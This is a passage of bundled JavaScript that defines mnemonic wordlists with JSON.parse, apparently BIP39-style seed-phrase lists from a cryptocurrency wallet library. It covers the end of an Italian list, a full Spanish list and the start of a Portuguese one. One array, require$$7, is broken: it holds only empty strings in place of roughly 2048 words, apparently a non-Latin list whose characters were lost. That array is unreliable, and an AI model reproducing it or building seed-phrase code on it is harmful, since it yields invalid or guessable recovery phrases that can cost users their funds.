alafede","malgrado","malinteso","malsano","malto","malumore","mana","mancia","mandorla","mangiare","manifesto","mannaro","manovra","mansarda","mantide","manubrio","mappa","maratona","marcire","maretta","marmo","marsupio","maschera","massaia","mastino","materasso","matricola","mattone","maturo","mazurca","meandro","meccanico","mecenate","medesimo","meditare","mega","melassa","melis","melodia","meninge","meno","mensola","mercurio","merenda","merlo","meschino","mese","messere","mestolo","metallo","metodo","mettere","miagolare","mica","micelio","michele","microbo","midollo","miele","migliore","milano","milite","mimosa","minerale","mini","minore","mirino","mirtillo","miscela","missiva","misto","misurare","mitezza","mitigare","mitra","mittente","mnemonico","modello","modifica","modulo","mogano","mogio","mole","molosso","monastero","monco","mondina","monetario","monile","monotono","monsone","montato","monviso","mora","mordere","morsicato","mostro","motivato","motosega","motto","movenza","movimento","mozzo","mucca","mucosa","muffa","mughetto","mugnaio","mulatto","mulinello","multiplo","mummia","munto","muovere","murale","musa","muscolo","musica","mutevole","muto","nababbo","nafta","nanometro","narciso","narice","narrato","nascere","nastrare","naturale","nautica","naviglio","nebulosa","necrosi","negativo","negozio","nemmeno","neofita","neretto","nervo","nessuno","nettuno","neutrale","neve","nevrotico","nicchia","ninfa","nitido","nobile","nocivo","nodo","nome","nomina","nordico","normale","norvegese","nostrano","notare","notizia","notturno","novella","nucleo","nulla","numero","nuovo","nutrire","nuvola","nuziale","oasi","obbedire","obbligo","obelisco","oblio","obolo","obsoleto","occasione","occhio","occidente","occorrere","occultare","ocra","oculato","odierno","odorare","offerta","offrire","offuscato","oggetto","oggi","ognuno","olandese","olfatto","oliato","oliva","ologramma","oltre","omaggio","ombelico","ombra","omega","omissione","ondoso","onere","onice","onnivoro","onorevole","onta","operato","opinione","opposto","oracolo","orafo","ordine","orecchino","orefice","orfano","organico","origine","orizzonte","orma","ormeggio","ornativo","orologio","orrendo","orribile","ortensia","ortica","orzata","orzo","osare","oscurare","osmosi","ospedale","ospite","ossa","ossidare","ostacolo","oste","otite","otre","ottagono","ottimo","ottobre","ovale","ovest","ovino","oviparo","ovocito","ovunque","ovviare","ozio","pacchetto","pace","pacifico","padella","padrone","paese","paga","pagina","palazzina","palesare","pallido","palo","palude","pandoro","pannello","paolo","paonazzo","paprica","parabola","parcella","parere","pargolo","pari","parlato","parola","partire","parvenza","parziale","passivo","pasticca","patacca","patologia","pattume","pavone","peccato","pedalare","pedonale","peggio","peloso","penare","pendice","penisola","pennuto","penombra","pensare","pentola","pepe","pepita","perbene","percorso","perdonato","perforare","pergamena","periodo","permesso","perno","perplesso","persuaso","pertugio","pervaso","pesatore","pesista","peso","pestifero","petalo","pettine","petulante","pezzo","piacere","pianta","piattino","piccino","picozza","piega","pietra","piffero","pigiama","pigolio","pigro","pila","pilifero","pillola","pilota","pimpante","pineta","pinna","pinolo","pioggia","piombo","piramide","piretico","pirite","pirolisi","pitone","pizzico","placebo","planare","plasma","platano","plenario","pochezza","poderoso","podismo","poesia","poggiare","polenta","poligono","pollice","polmonite","polpetta","polso","poltrona","polvere","pomice","pomodoro","ponte","popoloso","porfido","poroso","porpora","porre","portata","posa","positivo","possesso","postulato","potassio","potere","pranzo","prassi","pratica","precluso","predica","prefisso","pregiato","prelievo","premere","prenotare","preparato","presenza","pretesto","prevalso","prima","principe","privato","problema","procura","produrre","profumo","progetto","prolunga","promessa","pronome","proposta","proroga","proteso","prova","prudente","prugna","prurito","psiche","pubblico","pudica","pugilato","pugno","pulce","pulito","pulsante","puntare","pupazzo","pupilla","puro","quadro","qualcosa","quasi","querela","quota","raccolto","raddoppio","radicale","radunato","raffica","ragazzo","ragione","ragno","ramarro","ramingo","ramo","randagio","rantolare","rapato","rapina","rappreso","rasatura","raschiato","rasente","rassegna","rastrello","rata","ravveduto","reale","recepire","recinto","recluta","recondito","recupero","reddito","redimere","regalato","registro","regola","regresso","relazione","remare","remoto","renna","replica","reprimere","reputare","resa","residente","responso","restauro","rete","retina","retorica","rettifica","revocato","riassunto","ribadire","ribelle","ribrezzo","ricarica","ricco","ricevere","riciclato","ricordo","ricreduto","ridicolo","ridurre","rifasare","riflesso","riforma","rifugio","rigare","rigettato","righello","rilassato","rilevato","rimanere","rimbalzo","rimedio","rimorchio","rinascita","rincaro","rinforzo","rinnovo","rinomato","rinsavito","rintocco","rinuncia","rinvenire","riparato","ripetuto","ripieno","riportare","ripresa","ripulire","risata","rischio","riserva","risibile","riso","rispetto","ristoro","risultato","risvolto","ritardo","ritegno","ritmico","ritrovo","riunione","riva","riverso","rivincita","rivolto","rizoma","roba","robotico","robusto","roccia","roco","rodaggio","rodere","roditore","rogito","rollio","romantico","rompere","ronzio","rosolare","rospo","rotante","rotondo","rotula","rovescio","rubizzo","rubrica","ruga","rullino","rumine","rumoroso","ruolo","rupe","russare","rustico","sabato","sabbiare","sabotato","sagoma","salasso","saldatura","salgemma","salivare","salmone","salone","saltare","saluto","salvo","sapere","sapido","saporito","saraceno","sarcasmo","sarto","sassoso","satellite","satira","satollo","saturno","savana","savio","saziato","sbadiglio","sbalzo","sbancato","sbarra","sbattere","sbavare","sbendare","sbirciare","sbloccato","sbocciato","sbrinare","sbruffone","sbuffare","scabroso","scadenza","scala","scambiare","scandalo","scapola","scarso","scatenare","scavato","scelto","scenico","scettro","scheda","schiena","sciarpa","scienza","scindere","scippo","sciroppo","scivolo","sclerare","scodella","scolpito","scomparto","sconforto","scoprire","scorta","scossone","scozzese","scriba","scrollare","scrutinio","scuderia","scultore","scuola","scuro","scusare","sdebitare","sdoganare","seccatura","secondo","sedano","seggiola","segnalato","segregato","seguito","selciato","selettivo","sella","selvaggio","semaforo","sembrare","seme","seminato","sempre","senso","sentire","sepolto","sequenza","serata","serbato","sereno","serio","serpente","serraglio","servire","sestina","setola","settimana","sfacelo","sfaldare","sfamato","sfarzoso","sfaticato","sfera","sfida","sfilato","sfinge","sfocato","sfoderare","sfogo","sfoltire","sforzato","sfratto","sfruttato","sfuggito","sfumare","sfuso","sgabello","sgarbato","sgonfiare","sgorbio","sgrassato","sguardo","sibilo","siccome","sierra","sigla","signore","silenzio","sillaba","simbolo","simpatico","simulato","sinfonia","singolo","sinistro","sino","sintesi","sinusoide","sipario","sisma","sistole","situato","slitta","slogatura","sloveno","smarrito","smemorato","smentito","smeraldo","smilzo","smontare","smottato","smussato","snellire","snervato","snodo","sobbalzo","sobrio","soccorso","sociale","sodale","soffitto","sogno","soldato","solenne","solido","sollazzo","solo","solubile","solvente","somatico","somma","sonda","sonetto","sonnifero","sopire","soppeso","sopra","sorgere","sorpasso","sorriso","sorso","sorteggio","sorvolato","sospiro","sosta","sottile","spada","spalla","spargere","spatola","spavento","spazzola","specie","spedire","spegnere","spelatura","speranza","spessore","spettrale","spezzato","spia","spigoloso","spillato","spinoso","spirale","splendido","sportivo","sposo","spranga","sprecare","spronato","spruzzo","spuntino","squillo","sradicare","srotolato","stabile","stacco","staffa","stagnare","stampato","stantio","starnuto","stasera","statuto","stelo","steppa","sterzo","stiletto","stima","stirpe","stivale","stizzoso","stonato","storico","strappo","stregato","stridulo","strozzare","strutto","stuccare","stufo","stupendo","subentro","succoso","sudore","suggerito","sugo","sultano","suonare","superbo","supporto","surgelato","surrogato","sussurro","sutura","svagare","svedese","sveglio","svelare","svenuto","svezia","sviluppo","svista","svizzera","svolta","svuotare","tabacco","tabulato","tacciare","taciturno","tale","talismano","tampone","tannino","tara","tardivo","targato","tariffa","tarpare","tartaruga","tasto","tattico","taverna","tavolata","tazza","teca","tecnico","telefono","temerario","tempo","temuto","tendone","tenero","tensione","tentacolo","teorema","terme","terrazzo","terzetto","tesi","tesserato","testato","tetro","tettoia","tifare","tigella","timbro","tinto","tipico","tipografo","tiraggio","tiro","titanio","titolo","titubante","tizio","tizzone","toccare","tollerare","tolto","tombola","tomo","tonfo","tonsilla","topazio","topologia","toppa","torba","tornare","torrone","tortora","toscano","tossire","tostatura","totano","trabocco","trachea","trafila","tragedia","tralcio","tramonto","transito","trapano","trarre","trasloco","trattato","trave","treccia","tremolio","trespolo","tributo","tricheco","trifoglio","trillo","trincea","trio","tristezza","triturato","trivella","tromba","trono","troppo","trottola","trovare","truccato","tubatura","tuffato","tulipano","tumulto","tunisia","turbare","turchino","tuta","tutela","ubicato","uccello","uccisore","udire","uditivo","uffa","ufficio","uguale","ulisse","ultimato","umano","umile","umorismo","uncinetto","ungere","ungherese","unicorno","unificato","unisono","unitario","unte","uovo","upupa","uragano","urgenza","urlo","usanza","usato","uscito","usignolo","usuraio","utensile","utilizzo","utopia","vacante","vaccinato","vagabondo","vagliato","valanga","valgo","valico","valletta","valoroso","valutare","valvola","vampata","vangare","vanitoso","vano","vantaggio","vanvera","vapore","varano","varcato","variante","vasca","vedetta","vedova","veduto","vegetale","veicolo","velcro","velina","velluto","veloce","venato","vendemmia","vento","verace","verbale","vergogna","verifica","vero","verruca","verticale","vescica","vessillo","vestale","veterano","vetrina","vetusto","viandante","vibrante","vicenda","vichingo","vicinanza","vidimare","vigilia","vigneto","vigore","vile","villano","vimini","vincitore","viola","vipera","virgola","virologo","virulento","viscoso","visione","vispo","vissuto","visura","vita","vitello","vittima","vivanda","vivido","viziare","voce","voga","volatile","volere","volpe","voragine","vulcano","zampogna","zanna","zappato","zattera","zavorra","zefiro","zelante","zelo","zenzero","zerbino","zibetto","zinco","zircone","zitto","zolla","zotico","zucchero","zufolo","zulu","zuppa"]')
  , require$$6$1 = JSON.parse('["abaco","abdomen","abeja","abierto","abogado","abono","aborto","abrazo","abrir","abuelo","abuso","acabar","academia","acceso","accion","aceite","acelga","acento","aceptar","acido","aclarar","acne","acoger","acoso","activo","acto","actriz","actuar","acudir","acuerdo","acusar","adicto","admitir","adoptar","adorno","aduana","adulto","aereo","afectar","aficion","afinar","afirmar","agil","agitar","agonia","agosto","agotar","agregar","agrio","agua","agudo","aguila","aguja","ahogo","ahorro","aire","aislar","ajedrez","ajeno","ajuste","alacran","alambre","alarma","alba","album","alcalde","aldea","alegre","alejar","alerta","aleta","alfiler","alga","algodon","aliado","aliento","alivio","alma","almeja","almibar","altar","alteza","altivo","alto","altura","alumno","alzar","amable","amante","amapola","amargo","amasar","ambar","ambito","ameno","amigo","amistad","amor","amparo","amplio","ancho","anciano","ancla","andar","anden","anemia","angulo","anillo","animo","anis","anotar","antena","antiguo","antojo","anual","anular","anuncio","anadir","anejo","ano","apagar","aparato","apetito","apio","aplicar","apodo","aporte","apoyo","aprender","aprobar","apuesta","apuro","arado","arana","arar","arbitro","arbol","arbusto","archivo","arco","arder","ardilla","arduo","area","arido","aries","armonia","arnes","aroma","arpa","arpon","arreglo","arroz","arruga","arte","artista","asa","asado","asalto","ascenso","asegurar","aseo","asesor","asiento","asilo","asistir","asno","asombro","aspero","astilla","astro","astuto","asumir","asunto","atajo","ataque","atar","atento","ateo","atico","atleta","atomo","atraer","atroz","atun","audaz","audio","auge","aula","aumento","ausente","autor","aval","avance","avaro","ave","avellana","avena","avestruz","avion","aviso","ayer","ayuda","ayuno","azafran","azar","azote","azucar","azufre","azul","baba","babor","bache","bahia","baile","bajar","balanza","balcon","balde","bambu","banco","banda","bano","barba","barco","barniz","barro","bascula","baston","basura","batalla","bateria","batir","batuta","baul","bazar","bebe","bebida","bello","besar","beso","bestia","bicho","bien","bingo","blanco","bloque","blusa","boa","bobina","bobo","boca","bocina","boda","bodega","boina","bola","bolero","bolsa","bomba","bondad","bonito","bono","bonsai","borde","borrar","bosque","bote","botin","boveda","bozal","bravo","brazo","brecha","breve","brillo","brinco","brisa","broca","broma","bronce","brote","bruja","brusco","bruto","buceo","bucle","bueno","buey","bufanda","bufon","buho","buitre","bulto","burbuja","burla","burro","buscar","butaca","buzon","caballo","cabeza","cabina","cabra","cacao","cadaver","cadena","caer","cafe","caida","caiman","caja","cajon","cal","calamar","calcio","caldo","calidad","calle","calma","calor","calvo","cama","cambio","camello","camino","campo","cancer","candil","canela","canguro","canica","canto","cana","canon","caoba","caos","capaz","capitan","capote","captar","capucha","cara","carbon","carcel","careta","carga","carino","carne","carpeta","carro","carta","casa","casco","casero","caspa","castor","catorce","catre","caudal","causa","cazo","cebolla","ceder","cedro","celda","celebre","celoso","celula","cemento","ceniza","centro","cerca","cerdo","cereza","cero","cerrar","certeza","cesped","cetro","chacal","chaleco","champu","chancla","chapa","charla","chico","chiste","chivo","choque","choza","chuleta","chupar","ciclon","ciego","cielo","cien","cierto","cifra","cigarro","cima","cinco","cine","cinta","cipres","circo","ciruela","cisne","cita","ciudad","clamor","clan","claro","clase","clave","cliente","clima","clinica","cobre","coccion","cochino","cocina","coco","codigo","codo","cofre","coger","cohete","cojin","cojo","cola","colcha","colegio","colgar","colina","collar","colmo","columna","combate","comer","comida","comodo","compra","conde","conejo","conga","conocer","consejo","contar","copa","copia","corazon","corbata","corcho","cordon","corona","correr","coser","cosmos","costa","craneo","crater","crear","crecer","creido","crema","cria","crimen","cripta","crisis","cromo","cronica","croqueta","crudo","cruz","cuadro","cuarto","cuatro","cubo","cubrir","cuchara","cuello","cuento","cuerda","cuesta","cueva","cuidar","culebra","culpa","culto","cumbre","cumplir","cuna","cuneta","cuota","cupon","cupula","curar","curioso","curso","curva","cutis","dama","danza","dar","dardo","datil","deber","debil","decada","decir","dedo","defensa","definir","dejar","delfin","delgado","delito","demora","denso","dental","deporte","derecho","derrota","desayuno","deseo","desfile","desnudo","destino","desvio","detalle","detener","deuda","dia","diablo","diadema","diamante","diana","diario","dibujo","dictar","diente","dieta","diez","dificil","digno","dilema","diluir","dinero","directo","dirigir","disco","diseno","disfraz","diva","divino","doble","doce","dolor","domingo","don","donar","dorado","dormir","dorso","dos","dosis","dragon","droga","ducha","duda","duelo","dueno","dulce","duo","duque","durar","dureza","duro","ebano","ebrio","echar","eco","ecuador","edad","edicion","edificio","editor","educar","efecto","eficaz","eje","ejemplo","elefante","elegir","elemento","elevar","elipse","elite","elixir","elogio","eludir","embudo","emitir","emocion","empate","empeno","empleo","empresa","enano","encargo","enchufe","encia","enemigo","enero","enfado","enfermo","engano","enigma","enlace","enorme","enredo","ensayo","ensenar","entero","entrar","envase","envio","epoca","equipo","erizo","escala","escena","escolar","escribir","escudo","esencia","esfera","esfuerzo","espada","espejo","espia","esposa","espuma","esqui","estar","este","estilo","estufa","etapa","eterno","etica","etnia","evadir","evaluar","evento","evitar","exacto","examen","exceso","excusa","exento","exigir","exilio","existir","exito","experto","explicar","exponer","extremo","fabrica","fabula","fachada","facil","factor","faena","faja","falda","fallo","falso","faltar","fama","familia","famoso","faraon","farmacia","farol","farsa","fase","fatiga","fauna","favor","fax","febrero","fecha","feliz","feo","feria","feroz","fertil","fervor","festin","fiable","fianza","fiar","fibra","ficcion","ficha","fideo","fiebre","fiel","fiera","fiesta","figura","fijar","fijo","fila","filete","filial","filtro","fin","finca","fingir","finito","firma","flaco","flauta","flecha","flor","flota","fluir","flujo","fluor","fobia","foca","fogata","fogon","folio","folleto","fondo","forma","forro","fortuna","forzar","fosa","foto","fracaso","fragil","franja","frase","fraude","freir","freno","fresa","frio","frito","fruta","fuego","fuente","fuerza","fuga","fumar","funcion","funda","furgon","furia","fusil","futbol","futuro","gacela","gafas","gaita","gajo","gala","galeria","gallo","gamba","ganar","gancho","ganga","ganso","garaje","garza","gasolina","gastar","gato","gavilan","gemelo","gemir","gen","genero","genio","gente","geranio","gerente","germen","gesto","gigante","gimnasio","girar","giro","glaciar","globo","gloria","gol","golfo","goloso","golpe","goma","gordo","gorila","gorra","gota","goteo","gozar","grada","grafico","grano","grasa","gratis","grave","grieta","grillo","gripe","gris","grito","grosor","grua","grueso","grumo","grupo","guante","guapo","guardia","guerra","guia","guino","guion","guiso","guitarra","gusano","gustar","haber","habil","hablar","hacer","hacha","hada","hallar","hamaca","harina","haz","hazana","hebilla","hebra","hecho","helado","helio","hembra","herir","hermano","heroe","hervir","hielo","hierro","higado","higiene","hijo","himno","historia","hocico","hogar","hoguera","hoja","hombre","hongo","honor","honra","hora","hormiga","horno","hostil","hoyo","hueco","huelga","huerta","hueso","huevo","huida","huir","humano","humedo","humilde","humo","hundir","huracan","hurto","icono","ideal","idioma","idolo","iglesia","iglu","igual","ilegal","ilusion","imagen","iman","imitar","impar","imperio","imponer","impulso","incapaz","indice","inerte","infiel","informe","ingenio","inicio","inmenso","inmune","innato","insecto","instante","interes","intimo","intuir","inutil","invierno","ira","iris","ironia","isla","islote","jabali","jabon","jamon","jarabe","jardin","jarra","jaula","jazmin","jefe","jeringa","jinete","jornada","joroba","joven","joya","juerga","jueves","juez","jugador","jugo","juguete","juicio","junco","jungla","junio","juntar","jupiter","jurar","justo","juvenil","juzgar","kilo","koala","labio","lacio","lacra","lado","ladron","lagarto","lagrima","laguna","laico","lamer","lamina","lampara","lana","lancha","langosta","lanza","lapiz","largo","larva","lastima","lata","latex","latir","laurel","lavar","lazo","leal","leccion","leche","lector","leer","legion","legumbre","lejano","lengua","lento","lena","leon","leopardo","lesion","letal","letra","leve","leyenda","libertad","libro","licor","lider","lidiar","lienzo","liga","ligero","lima","limite","limon","limpio","lince","lindo","linea","lingote","lino","linterna","liquido","liso","lista","litera","litio","litro","llaga","llama","llanto","llave","llegar","llenar","llevar","llorar","llover","lluvia","lobo","locion","loco","locura","logica","logro","lombriz","lomo","lonja","lote","lucha","lucir","lugar","lujo","luna","lunes","lupa","lustro","luto","luz","maceta","macho","madera","madre","maduro","maestro","mafia","magia","mago","maiz","maldad","maleta","malla","malo","mama","mambo","mamut","manco","mando","manejar","manga","maniqui","manjar","mano","manso","manta","manana","mapa","maquina","mar","marco","marea","marfil","margen","marido","marmol","marron","martes","marzo","masa","mascara","masivo","matar","materia","matiz","matriz","maximo","mayor","mazorca","mecha","medalla","medio","medula","mejilla","mejor","melena","melon","memoria","menor","mensaje","mente","menu","mercado","merengue","merito","mes","meson","meta","meter","metodo","metro","mezcla","miedo","miel","miembro","miga","mil","milagro","militar","millon","mimo","mina","minero","minimo","minuto","miope","mirar","misa","miseria","misil","mismo","mitad","mito","mochila","mocion","moda","modelo","moho","mojar","molde","moler","molino","momento","momia","monarca","moneda","monja","monto","mono","morada","morder","moreno","morir","morro","morsa","mortal","mosca","mostrar","motivo","mover","movil","mozo","mucho","mudar","mueble","muela","muerte","muestra","mugre","mujer","mula","muleta","multa","mundo","muneca","mural","muro","musculo","museo","musgo","musica","muslo","nacar","nacion","nadar","naipe","naranja","nariz","narrar","nasal","natal","nativo","natural","nausea","naval","nave","navidad","necio","nectar","negar","negocio","negro","neon","nervio","neto","neutro","nevar","nevera","nicho","nido","niebla","nieto","ninez","nino","nitido","nivel","nobleza","noche","nomina","noria","norma","norte","nota","noticia","novato","novela","novio","nube","nuca","nucleo","nudillo","nudo","nuera","nueve","nuez","nulo","numero","nutria","oasis","obeso","obispo","objeto","obra","obrero","observar","obtener","obvio","oca","ocaso","oceano","ochenta","ocho","ocio","ocre","octavo","octubre","oculto","ocupar","ocurrir","odiar","odio","odisea","oeste","ofensa","oferta","oficio","ofrecer","ogro","oido","oir","ojo","ola","oleada","olfato","olivo","olla","olmo","olor","olvido","ombligo","onda","onza","opaco","opcion","opera","opinar","oponer","optar","optica","opuesto","oracion","orador","oral","orbita","orca","orden","oreja","organo","orgia","orgullo","oriente","origen","orilla","oro","orquesta","oruga","osadia","oscuro","osezno","oso","ostra","otono","otro","oveja","ovulo","oxido","oxigeno","oyente","ozono","pacto","padre","paella","pagina","pago","pais","pajaro","palabra","palco","paleta","palido","palma","paloma","palpar","pan","panal","panico","pantera","panuelo","papa","papel","papilla","paquete","parar","parcela","pared","parir","paro","parpado","parque","parrafo","parte","pasar","paseo","pasion","paso","pasta","pata","patio","patria","pausa","pauta","pavo","payaso","peaton","pecado","pecera","pecho","pedal","pedir","pegar","peine","pelar","peldano","pelea","peligro","pellejo","pelo","peluca","pena","pensar","penon","peon","peor","pepino","pequeno","pera","percha","perder","pereza","perfil","perico","perla","permiso","perro","persona","pesa","pesca","pesimo","pestana","petalo","petroleo","pez","pezuna","picar","pichon","pie","piedra","pierna","pieza","pijama","pilar","piloto","pimienta","pino","pintor","pinza","pina","piojo","pipa","pirata","pisar","piscina","piso","pista","piton","pizca","placa","plan","plata","playa","plaza","pleito","pleno","plomo","pluma","plural","pobre","poco","poder","podio","poema","poesia","poeta","polen","policia","pollo","polvo","pomada","pomelo","pomo","pompa","poner","porcion","portal","posada","poseer","posible","poste","potencia","potro","pozo","prado","precoz","pregunta","premio","prensa","preso","previo","primo","principe","prision","privar","proa","probar","proceso","producto","proeza","profesor","programa","prole","promesa","pronto","propio","proximo","prueba","publico","puchero","pudor","pueblo","puerta","puesto","pulga","pulir","pulmon","pulpo","pulso","puma","punto","punal","puno","pupa","pupila","pure","quedar","queja","quemar","querer","queso","quieto","quimica","quince","quitar","rabano","rabia","rabo","racion","radical","raiz","rama","rampa","rancho","rango","rapaz","rapido","rapto","rasgo","raspa","rato","rayo","raza","razon","reaccion","realidad","rebano","rebote","recaer","receta","rechazo","recoger","recreo","recto","recurso","red","redondo","reducir","reflejo","reforma","refran","refugio","regalo","regir","regla","regreso","rehen","reino","reir","reja","relato","relevo","relieve","relleno","reloj","remar","remedio","remo","rencor","rendir","renta","reparto","repetir","reposo","reptil","res","rescate","resina","respeto","resto","resumen","retiro","retorno","retrato","reunir","reves","revista","rey","rezar","rico","riego","rienda","riesgo","rifa","rigido","rigor","rincon","rinon","rio","riqueza","risa","ritmo","rito","rizo","roble","roce","rociar","rodar","rodeo","rodilla","roer","rojizo","rojo","romero","romper","ron","ronco","ronda","ropa","ropero","rosa","rosca","rostro","rotar","rubi","rubor","rudo","rueda","rugir","ruido","ruina","ruleta","rulo","rumbo","rumor","ruptura","ruta","rutina","sabado","saber","sabio","sable","sacar","sagaz","sagrado","sala","saldo","salero","salir","salmon","salon","salsa","salto","salud","salvar","samba","sancion","sandia","sanear","sangre","sanidad","sano","santo","sapo","saque","sardina","sarten","sastre","satan","sauna","saxofon","seccion","seco","secreto","secta","sed","seguir","seis","sello","selva","semana","semilla","senda","sensor","senal","senor","separar","sepia","sequia","ser","serie","sermon","servir","sesenta","sesion","seta","setenta","severo","sexo","sexto","sidra","siesta","siete","siglo","signo","silaba","silbar","silencio","silla","simbolo","simio","sirena","sistema","sitio","situar","sobre","socio","sodio","sol","solapa","soldado","soledad","solido","soltar","solucion","sombra","sondeo","sonido","sonoro","sonrisa","sopa","soplar","soporte","sordo","sorpresa","sorteo","sosten","sotano","suave","subir","suceso","sudor","suegra","suelo","sueno","suerte","sufrir","sujeto","sultan","sumar","superar","suplir","suponer","supremo","sur","surco","sureno","surgir","susto","sutil","tabaco","tabique","tabla","tabu","taco","tacto","tajo","talar","talco","talento","talla","talon","tamano","tambor","tango","tanque","tapa","tapete","tapia","tapon","taquilla","tarde","tarea","tarifa","tarjeta","tarot","tarro","tarta","tatuaje","tauro","taza","tazon","teatro","techo","tecla","tecnica","tejado","tejer","tejido","tela","telefono","tema","temor","templo","tenaz","tender","tener","tenis","tenso","teoria","terapia","terco","termino","ternura","terror","tesis","tesoro","testigo","tetera","texto","tez","tibio","tiburon","tiempo","tienda","tierra","tieso","tigre","tijera","tilde","timbre","timido","timo","tinta","tio","tipico","tipo","tira","tiron","titan","titere","titulo","tiza","toalla","tobillo","tocar","tocino","todo","toga","toldo","tomar","tono","tonto","topar","tope","toque","torax","torero","tormenta","torneo","toro","torpedo","torre","torso","tortuga","tos","tosco","toser","toxico","trabajo","tractor","traer","trafico","trago","traje","tramo","trance","trato","trauma","trazar","trebol","tregua","treinta","tren","trepar","tres","tribu","trigo","tripa","triste","triunfo","trofeo","trompa","tronco","tropa","trote","trozo","truco","trueno","trufa","tuberia","tubo","tuerto","tumba","tumor","tunel","tunica","turbina","turismo","turno","tutor","ubicar","ulcera","umbral","unidad","unir","universo","uno","untar","una","urbano","urbe","urgente","urna","usar","usuario","util","utopia","uva","vaca","vacio","vacuna","vagar","vago","vaina","vajilla","vale","valido","valle","valor","valvula","vampiro","vara","variar","varon","vaso","vecino","vector","vehiculo","veinte","vejez","vela","velero","veloz","vena","vencer","venda","veneno","vengar","venir","venta","venus","ver","verano","verbo","verde","vereda","verja","verso","verter","via","viaje","vibrar","vicio","victima","vida","video","vidrio","viejo","viernes","vigor","vil","villa","vinagre","vino","vinedo","violin","viral","virgo","virtud","visor","vispera","vista","vitamina","viudo","vivaz","vivero","vivir","vivo","volcan","volumen","volver","voraz","votar","voto","voz","vuelo","vulgar","yacer","yate","yegua","yema","yerno","yeso","yodo","yoga","yogur","zafiro","zanja","zapato","zarza","zona","zorro","zumo","zurdo"]')
  , require$$7 = JSON.parse('["","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","",""]')
  , require$$8 = JSON.parse('["abacate","abaixo","abalar","abater","abduzir","abelha","aberto","abismo","abotoar","abranger","abreviar","abrigar","abrupto","absinto","absoluto","absurdo","abutre","acabado","acalmar","acampar","acanhar","acaso","aceitar","acelerar","acenar","acervo","acessar","acetona","achatar","acidez","acima","acionado","acirrar","aclamar","aclive","acolhida","acomodar","acoplar","acordar","acumular","acusador","adaptar","adega","adentro","adepto","adequar","aderente","adesivo","adeus","adiante","aditivo","adjetivo","adjunto","admirar","adorar","adquirir","adubo","adverso","advogado","aeronave","afastar","aferir","afetivo","afinador","afivelar","aflito","afluente","afrontar","agachar","agarrar","agasalho","agenciar","agilizar","agiota","agitado","agora","agradar","agreste","agrupar","aguardar","agulha","ajoelhar","ajudar","ajustar","alameda","alarme","alastrar","alavanca","albergue","albino","alcatra","aldeia","alecrim","alegria","alertar","alface","alfinete","algum","alheio","aliar","alicate","alienar","alinhar","aliviar","almofada","alocar","alpiste","alterar","altitude","alucinar","alugar","aluno","alusivo","alvo","amaciar","amador","amarelo","amassar","ambas","a